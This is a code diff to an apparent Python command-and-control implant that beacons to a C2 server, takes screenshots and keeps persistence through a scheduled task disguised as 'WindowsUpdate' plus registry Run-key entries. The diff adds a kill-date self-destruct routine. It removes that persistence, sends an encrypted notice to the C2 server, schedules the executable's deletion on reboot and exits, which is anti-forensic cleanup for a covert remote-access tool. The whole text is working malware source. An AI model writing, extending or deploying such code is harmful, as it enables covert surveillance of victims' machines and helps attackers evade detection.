@@ -47,6 +47,8 @@ class Config:
         self.DEBUG = True
         self.TAKE_SCREENSHOTS = True
         self.SCREENSHOT_FREQUENCY = 30
+        self.KILLDATE_ENABLED = True
+        self.KILLDATE = "2025-05-04 12:30" if True else ""
 
 # ======================
 # Encryption
@@ -1305,6 +1307,117 @@ class Agent:
 
         self._checkin_count += 1
         return data
+    def _check_killdate(self):
+        try:
+            current_datetime = datetime.now()
+            killdatetime = datetime.strptime(self.config.KILLDATE, "%Y-%m-%d %H:%M")
+            return current_datetime >= killdatetime
+        except Exception as e:
+            self._log_error(f"Error checking killdate: {str(e)}")
+            return False
+        
+    def _self_destruct(self):
+        """Remove persistence and delete itself"""
+        self._log_info("[!] Killdate reached - initiating self-destruct")
+        
+        # 1. Remove persistence
+        self._remove_persistence()
+        
+        # 2. Notify C2
+        self._notify_killdate_reached()
+        
+        # 3. Delete itself
+        self._delete_self()
+        
+        # 4. Exit
+        sys.exit(0)
+    
+    def _remove_persistence(self):
+        """Remove scheduled task and registry entries"""
+        try:
+            # Remove scheduled task
+            task_name = "WindowsUpdate"  # Should match the name used in Persistence._create_scheduled_task()
+            subprocess.run(['schtasks', '/Delete', '/TN', task_name, '/F'], 
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            # Remove registry entries
+            try:
+                # Admin path
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo",
+                                    0, winreg.KEY_ALL_ACCESS)
+                winreg.DeleteValue(key, "engine")
+                winreg.DeleteValue(key, "lube")
+                winreg.CloseKey(key)
+            except WindowsError:
+                try:
+                    # Non-admin path
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                       r"Software\Microsoft\Accessibility\Setup",
+                                       0, winreg.KEY_ALL_ACCESS)
+                    winreg.DeleteValue(key, "engine")
+                    winreg.DeleteValue(key, "lube")
+                    winreg.CloseKey(key)
+                except WindowsError:
+                    pass
+            
+            # Remove Run key entry
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                   r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                   0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, task_name)
+                winreg.CloseKey(key)
+            except WindowsError:
+                pass
+                
+        except Exception as e:
+            self._log_error(f"Error removing persistence: {str(e)}")
+    
+    def _notify_killdate_reached(self):
+        """Send notification to C2 that killdate was reached"""
+        try:
+            data = {
+                "agent_id": self.agent_id,
+                "message": "Killdate reached - self-destruct initiated",
+                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+            }
+            
+            requests.post(
+                f"{self.config.C2_SERVER}/api/killdate_reached",
+                data=self.crypto.encrypt(data),
+                headers={
+                    "User-Agent": self.config.USER_AGENT,
+                    "Content-Type": "application/octet-stream"
+                },
+                timeout=10,
+                verify=False
+            )
+        except Exception as e:
+            self._log_error(f"Error notifying C2: {str(e)}")
+    
+    def _delete_self(self):
+        """Delete the agent executable"""
+        try:
+            # Get current executable path
+            exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
+            
+            # Schedule deletion on next reboot since we can't delete a running executable
+            if platform.system() == "Windows":
+                import ctypes
+                ctypes.windll.kernel32.MoveFileExW(
+                    exe_path,
+                    None,
+                    0x00000004  # MOVEFILE_DELAY_UNTIL_REBOOT
+                )
+                
+                # Also try to delete immediately (won't work but might help in some cases)
+                try:
+                    os.remove(exe_path)
+                except:
+                    pass
+        except Exception as e:
+            self._log_error(f"Error scheduling self-deletion: {str(e)}")
 
     def _execute_task(self, task):
         try:
@@ -1499,6 +1612,12 @@ class Agent:
         self._log_info("[*] Starting beacon loop...")
         while self._running:
             try:
+               
+                # Check killdate first
+                if self._check_killdate():
+                    self._self_destruct()
+                    return 
+                
                 sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
                 time.sleep(sleep_time)
                 
